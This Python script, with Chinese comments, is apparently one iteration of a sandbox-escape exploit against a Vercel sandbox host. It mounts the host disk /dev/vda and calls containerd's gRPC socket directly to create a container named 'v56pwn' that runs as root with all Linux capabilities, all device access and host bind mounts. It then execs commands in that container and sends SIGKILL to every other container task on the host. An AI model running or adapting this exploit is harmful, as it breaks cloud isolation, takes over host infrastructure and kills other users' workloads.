# -*- coding: utf-8 -*-
"""vda56: 容器启动失败根因诊断 (读 shim log / Tasks/Get / rootfs python3 / Exec 验证)
v55 发现: Tasks/Start 成功但容器 payload 零输出 -> 可能 sh 挂起或 python3 缺失
"""
import os, time, socket, ctypes, re, struct, subprocess, json

OUT = '/vercel/sandbox/v56m.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')
EXTRA = '/mnt/vdax/root/v56m.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    try:
        open(EXTRA, 'a', encoding='utf-8', errors='replace').write(line + '\n')
    except Exception:
        pass
    print(line, flush=True)


def curl_h2(sockpath, path, body, t=6, ns='default'):
    try:
        tmp = '/vercel/sandbox/curl_req.bin'
        hdr = '/vercel/sandbox/curl_hdr.txt'
        open(tmp, 'wb').write(body)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: application/grpc', '-H', 'TE: trailers']
        if ns:
            cmd += ['-H', 'containerd-namespace: %s' % ns]
        cmd += ['-D', hdr, '--data-binary', '@%s' % tmp, 'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 2)
        hdrtxt = ''
        try:
            hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' ')[:200]
        except Exception:
            pass
        return 'rc=%d HDR:%s' % (r.returncode, hdrtxt), r.stdout
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pmsg(field_no, payload):
    return pvarint((field_no << 3) | 2) + pvarint(len(payload)) + payload


def pbool(field_no, v):
    return pvarint((field_no << 3) | 0) + pvarint(1 if v else 0)


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount vda ret=%d' % ret)

    CSP = '/mnt/vdax/run/containerd/containerd.sock'
    IMAGE = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
    CID = 'v56pwn'
    TASK = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default/%s' % CID

    # 简单 payload: 只 echo 验证 (spec process 直接 echo, 不依赖 python3)
    spec_args = ("sh", "-c", "echo CT_START_$$ > /mnt/root/v56_echo.txt; ls -la /mnt/root/ >> /mnt/root/v56_echo.txt; sleep 99999")

    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/List', grpc_env(b''), t=4)
    m = re.search(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}-snapshot', out or b'')
    sk = m.group().decode() if m else None
    log('list %s snap_key=%s' % (rc, sk))

    caps = ["CAP_AUDIT_CONTROL", "CAP_AUDIT_READ", "CAP_AUDIT_WRITE", "CAP_BLOCK_SUSPEND", "CAP_BPF",
            "CAP_CHECKPOINT_RESTORE", "CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_FOWNER",
            "CAP_FSETID", "CAP_IPC_LOCK", "CAP_IPC_OWNER", "CAP_KILL", "CAP_LEASE", "CAP_LINUX_IMMUTABLE",
            "CAP_MAC_ADMIN", "CAP_MAC_OVERRIDE", "CAP_MKNOD", "CAP_NET_ADMIN", "CAP_NET_BIND_SERVICE",
            "CAP_NET_BROADCAST", "CAP_NET_RAW", "CAP_PERFMON", "CAP_SETFCAP", "CAP_SETGID", "CAP_SETPCAP",
            "CAP_SETUID", "CAP_SYS_ADMIN", "CAP_SYS_BOOT", "CAP_SYS_CHROOT", "CAP_SYS_MODULE", "CAP_SYS_NICE",
            "CAP_SYS_PACCT", "CAP_SYS_PTRACE", "CAP_SYS_RAWIO", "CAP_SYS_RESOURCE", "CAP_SYS_TIME",
            "CAP_SYS_TTY_CONFIG", "CAP_SYSLOG", "CAP_WAKE_ALARM"]
    spec = {
        "ociVersion": "1.0.2",
        "process": {
            "user": {"uid": 0, "gid": 0},
            "args": list(spec_args),
            "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
            "cwd": "/",
            "capabilities": {"bounding": caps, "effective": caps, "permitted": caps, "ambient": caps}
        },
        "root": {"path": "rootfs"},
        "mounts": [
            {"destination": "/proc", "type": "proc", "source": "proc"},
            {"destination": "/dev", "type": "bind", "source": "/dev", "options": ["rbind", "rw"]},
            {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["rbind", "ro"]},
            {"destination": "/usr", "type": "bind", "source": "/usr", "options": ["rbind", "ro"]},
            {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["rbind", "ro"]},
            {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["rbind", "ro"]},
            {"destination": "/etc", "type": "bind", "source": "/etc", "options": ["rbind", "ro"]}
        ],
        "linux": {
            "resources": {"devices": [{"allow": True, "access": "rwm"}]},
            "cgroupsPath": "/v56pwn-ctr",
            "namespaces": [{"type": "mount"}, {"type": "pid"}, {"type": "uts"}, {"type": "ipc"}]
        }
    }
    spec_json = json.dumps(spec).encode()
    runtime = pstr(1, 'io.containerd.runc.v2')
    any_spec = pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, spec_json)
    ctr = pstr(1, CID) + pstr(3, IMAGE) + pmsg(4, runtime) + pmsg(5, any_spec) + pstr(6, 'overlayfs')
    if sk:
        ctr += pstr(7, sk)
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/Create', grpc_env(pmsg(1, ctr)), t=8)
    log('Create %s out=%r' % (rc, out[:200]))
    ok = 'grpc-status: 0' in rc
    if ok:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Create', grpc_env(pstr(1, CID)), t=10)
        log('Tasks/Create %s out=%r' % (rc, out[:200]))
        ok = 'grpc-status: 0' in rc
    if ok:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(pstr(1, CID)), t=10)
        log('Tasks/Start %s out=%r' % (rc, out[:150]))

    time.sleep(4)

    # --- 诊断 1: task 状态 (Tasks/Get) ---
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Get', grpc_env(pstr(1, CID)), t=5)
    log('Get %s out=%r' % (rc, out[:300]))

    # --- 诊断 2: shim log / log.json ---
    for fn in ['log', 'log.json', 'config.json', 'options.json', 'bootstrap.json']:
        fp = os.path.join(TASK, fn)
        try:
            if os.path.exists(fp):
                data = open(fp, 'rb').read(2000)
                log('%s (%d): %s' % (fn, len(data), data[:1200].decode(errors='replace')))
        except Exception as e:
            log('%s EXC %s' % (fn, e))

    # --- 诊断 3: 容器 echo 文件 (vda 上) ---
    try:
        fp = '/mnt/vdax/root/v56_echo.txt'
        log('v56_echo.txt: %s' % (open(fp, errors='replace').read()[:800] if os.path.exists(fp) else 'NOT FOUND'))
    except Exception as e:
        log('echo EXC %s' % e)

    # --- 诊断 4: snapshotter 里找容器 rootfs + python3 ---
    try:
        base = '/mnt/vdax/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots'
        for d in sorted(os.listdir(base)):
            fs = os.path.join(base, d, 'fs')
            py = os.path.exists(os.path.join(fs, 'bin/python3')) or os.path.exists(os.path.join(fs, 'usr/bin/python3'))
            sh = os.path.exists(os.path.join(fs, 'bin/sh'))
            if py or sh:
                log('snap %s: python3=%s sh=%s' % (d, py, sh))
    except Exception as e:
        log('snap EXC %s' % e)

    # --- 诊断 5: Tasks/Exec 在容器里执行 (验证 exec 通道) ---
    try:
        proc = (pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Process')
                + pmsg(2, json.dumps({
                    "user": {"uid": 0, "gid": 0},
                    "args": ["/bin/sh", "-c", "echo EXEC_OK_$$ > /mnt/root/v56_exec.txt; ls / >> /mnt/root/v56_exec.txt"],
                    "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
                    "cwd": "/",
                    "capabilities": {"bounding": caps, "effective": caps, "permitted": caps, "ambient": caps}
                }).encode()))
        req = pstr(1, CID) + pstr(2, CID + '-exec1') + pmsg(3, proc) + pbool(4, False)
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Exec', grpc_env(req), t=8)
        log('Exec %s out=%r' % (rc, out[:200]))
        if 'grpc-status: 0' in rc:
            rc2, out2 = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(pstr(1, CID) + pstr(2, CID + '-exec1')), t=8)
            log('ExecStart %s out=%r' % (rc2, out2[:200]))
            time.sleep(2)
            fp = '/mnt/vdax/root/v56_exec.txt'
            log('v56_exec.txt: %s' % (open(fp, errors='replace').read()[:800] if os.path.exists(fp) else 'NOT FOUND'))
    except Exception as e:
        log('Exec EXC %s' % e)

    base = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default'
    targets = []
    try:
        for d in sorted(os.listdir(base)):
            if d != CID:
                targets.append(d)
    except Exception as e:
        log('list task ERR %s' % e)
    log('kill targets: %s' % targets)
    for cid in targets:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Kill',
                          grpc_env(pstr(1, cid) + pvarint(3 << 3 | 0) + pvarint(9)), t=4)
        log('kill %s %s' % (cid, rc))
    log('V56M_DONE')
    f.close()


if __name__ == '__main__':
    main()
